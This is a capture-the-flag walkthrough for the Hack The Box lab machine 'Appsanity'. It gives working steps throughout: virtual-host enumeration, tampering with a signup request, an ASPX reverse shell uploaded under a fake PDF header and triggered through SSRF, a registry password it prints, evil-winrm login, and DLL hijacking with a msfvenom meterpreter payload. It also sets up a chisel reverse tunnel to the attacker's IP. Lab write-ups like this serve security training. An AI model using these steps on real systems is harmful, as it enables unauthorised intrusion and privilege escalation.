 <font size="10">Appsanity</font>

	

### Difficulty:

`hard`

# Enumeration

Port 22/80 open and another port 7680 with service pando-pub.

Website on port 80 hosted on a Windwos Machine.

## Adding meddigi.htb
 
```
echo '10.10.11.238 meddigi.htb' | sudo tee -a /etc/hosts
```

## VHOST Enumeration

```
gobuster vhost -u https://meddigi.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 40 -k

Found: portal.meddigi.htb Status: 200 [Size: 2976]
```

## Adding new vhost

```
 echo '10.10.11.238 portal.meddigi.htb' | sudo tee -a /etc/hosts
```

## Creating Medicaccount

Use burpsuite or another webproxy and change the Acctype=2 for the POST Request.

```
POST /Signup/SignUp HTTP/2
Host: meddigi.htb
Cookie: .AspNetCore.Antiforgery.ML5pX7jOz00=CfDJ8Iv6u6K2FUZAoGw6DvgspEndHLWyVUHRj_MC0o_QkYgKVdzcb_WOEu9uMf7tYqTRe8iWVFV4h6HXz7-_O9T4DPSBTqez1ZEv8hAvh4Xh-fEwE-TIpGW0YRu-wrpTZ8QqDK5_1ko2wtgcal6Qc99jWUE
Content-Length: 360
Cache-Control: max-age=0
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://meddigi.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://meddigi.htb/signup
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

Name=htb&LastName=htb&Email=htb%40htb.com&Password=GYWHpXX8sWgOQg77UpKP&ConfirmPassword=GYWHpXX8sWgOQg77UpKP&DateOfBirth=2000-01-01&PhoneNumber=0123456789&Country=hlho&Acctype=2&__RequestVerificationToken=CfDJ8Iv6u6K2FUZAoGw6DvgspEm612x-aRUDUNkmE4c7sLag94-jKuR_5yQjGRtRidQa-6_YKmKZVsx9MJHnnCLqiit99dPVp3BabKO2FAmmL4B_V4UtTFkKaiZhn8WE_7pktNeqh6CcPl5hTT8yGQ8ZBzM
```

## Login to portal

Login to the Portal using the cookie access_token.

# Foothold

## Upload shell

Upload a reverse Shell using this as a template, keep the extension but add 
```
%PDF-1.7
```

https://github.com/borjmz/aspx-reverse-shell


## Trigger shell

At the issue Prescrition an ssrf can be triggert. Getting URL of our shell by entering http://127.0.0.1.8080 in Prescription Link.


Trigger shell by entering the url
```
http://127.0.0.1:8080/ViewReport.aspx?file=2e85d00e-5c24-449e-a349-117cc76a69a5_shell.aspx
```

# Privilege Escalation

## Query Key:

Using dnSpy to decode ExaminationManageMent.dll 
```
using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\MedDigi"))
```

```202
meterpreter > reg queryval -k HKLM\\Software\\MedDigi -v EncKey
Key: HKLM\Software\MedDigi
Name: EncKey
Type: REG_SZ
Data: 1g0tTh3R3m3dy!!
```

## Connect as devdoc

```
evil-winrm -i 10.10.11.238 -u devdoc -p '1g0tTh3R3m3dy!!'
```

## Reverse engineering

Downloading ReportManagement.exe from C:\Program Files\ReportManagement. 

C:\Program Files\ReportManagement\Libraries\externalupload.dll is vulnerable to hijacking dll

## Createing shell-code

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f dll -o externalupload.dll
```

## Uploading shell

```
*Evil-WinRM* PS C:\Program Files\ReportManagement\Libraries> upload externalupload.dll
```

## Forwarding Reports Management administrative console(from first shell)

```
portfwd add -l 10100 -p 100 -r 127.0.0.1
```

and connect via nc.

## Connect to ReportManagement

```
 nc 127.0.0.1 10100
```

and trigger shell by "upload anything"

### Chispel

Having Problem with the payload use chipsel for porfowarding

Attacker
```
chisel server --port 8888 --reverse
```

Victim
```
*Evil-WinRM* PS C:\Users\devdoc\Desktop> ./chisel.exe client 10.10.14.8:8888 R:100:127.0.0.1:100
```




